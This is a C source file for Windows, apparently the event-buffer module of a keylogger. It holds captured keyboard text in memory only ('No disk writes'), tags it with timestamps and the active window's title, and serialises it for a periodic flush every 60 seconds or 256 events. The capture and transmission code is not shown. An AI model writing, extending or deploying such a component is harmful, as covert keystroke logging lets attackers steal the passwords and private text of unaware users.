// In-memory event buffer. Growable array with a hard cap on serialized text
// (oldest events are dropped when the cap is exceeded). No disk writes.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <stdio.h>
#include <string.h>

#include "buffer.h"
#include "capture.h" // kbd_title_at

#define MAX_EVENTS     4096
#define MAX_TEXT_BYTES (64 * 1024)

static CRITICAL_SECTION g_lock;
static KEvent  *g_events;
static size_t    g_count;
static size_t    g_cap;
static size_t    g_text_bytes; // approximation: total wchar text

void buf_init(void)
{
    InitializeCriticalSection(&g_lock);
    g_cap = 256;
    g_events = (KEvent *)HeapAlloc(GetProcessHeap(), 0, g_cap * sizeof(KEvent));
}

void buf_push(const KEvent *ev)
{
    EnterCriticalSection(&g_lock);

    if (g_count == g_cap) {
        if (g_cap < MAX_EVENTS) {
            size_t newcap = g_cap * 2;
            KEvent *grown = (KEvent *)HeapReAlloc(GetProcessHeap(), 0,
                                                 g_events, newcap * sizeof(KEvent));
            if (grown) {
                g_events = grown;
                g_cap = newcap;
            }
        }
        if (g_count == g_cap) { // full and cannot grow: drop the oldest
            memmove(&g_events[0], &g_events[1], (g_count - 1) * sizeof(KEvent));
            g_count--;
        }
    }

    size_t text_len = 0;
    while (ev->text[text_len])
        text_len++;

    g_events[g_count++] = *ev;
    g_text_bytes += text_len * 2;

    while (g_text_bytes > MAX_TEXT_BYTES && g_count > 1) {
        size_t drop_len = 0;
        while (g_events[0].text[drop_len])
            drop_len++;
        g_text_bytes -= drop_len * 2;
        memmove(&g_events[0], &g_events[1], (g_count - 1) * sizeof(KEvent));
        g_count--;
    }

    LeaveCriticalSection(&g_lock);
}

size_t buf_count(void)
{
    EnterCriticalSection(&g_lock);
    size_t n = g_count;
    LeaveCriticalSection(&g_lock);
    return n;
}

bool buf_should_flush(uint64_t now)
{
    EnterCriticalSection(&g_lock);
    bool due = g_count > 0 &&
              (g_count >= 256 ||
               (g_events[0].epoch_ms != 0 && now - g_events[0].epoch_ms >= 60000));
    LeaveCriticalSection(&g_lock);
    return due;
}

static void append_text(char **dst, size_t *used, size_t *cap,
                       const char *src, size_t n)
{
    if (*used + n + 1 > *cap) {
        size_t newcap = (*cap) * 2 + n + 16;
        char *grown = (char *)HeapReAlloc(GetProcessHeap(), 0, *dst, newcap);
        if (!grown)
            return;
        *dst = grown;
        *cap = newcap;
    }
    memcpy(*dst + *used, src, n);
    *used += n;
}

char *buf_serialize(void)
{
    EnterCriticalSection(&g_lock);

    size_t cap = 1024, used = 0;
    char *out = (char *)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!out) {
        LeaveCriticalSection(&g_lock);
        return NULL;
    }

    uint32_t cur_title = 0xFFFFFFFF;
    char stamp[40];

    for (size_t i = 0; i < g_count; i++) {
        const KEvent *ev = &g_events[i];

        if (ev->title_idx != cur_title) {
            cur_title = ev->title_idx;
            SYSTEMTIME st;
            FILETIME ft;
            ULARGE_INTEGER u = {0};
            u.QuadPart = (ev->epoch_ms + 11644473600000ULL) * 10000ULL;
            ft.dwLowDateTime = u.LowPart;
            ft.dwHighDateTime = u.HighPart;
            FileTimeToSystemTime(&ft, &st);
            snprintf(stamp, sizeof(stamp), "[%04u-%02u-%02u %02u:%02u:%02u]",
                     st.wYear, st.wMonth, st.wDay,
                     st.wHour, st.wMinute, st.wSecond);
            append_text(&out, &used, &cap, "\n", 1);
            append_text(&out, &used, &cap, stamp, strlen(stamp));
            append_text(&out, &used, &cap, " | ", 3);
            append_text(&out, &used, &cap, kbd_title_at(cur_title),
                        strlen(kbd_title_at(cur_title)));
            append_text(&out, &used, &cap, " |\n", 3);
        }

        char utf8[32];
        int n = WideCharToMultiByte(CP_UTF8, 0, ev->text, -1,
                                    utf8, sizeof(utf8), NULL, NULL);
        if (n > 1)
            append_text(&out, &used, &cap, utf8, (size_t)(n - 1));
    }

    out[used] = '\0';
    LeaveCriticalSection(&g_lock);
    return out;
}

void buf_clear(void)
{
    EnterCriticalSection(&g_lock);
    g_count = 0;
    g_text_bytes = 0;
    LeaveCriticalSection(&g_lock);
}
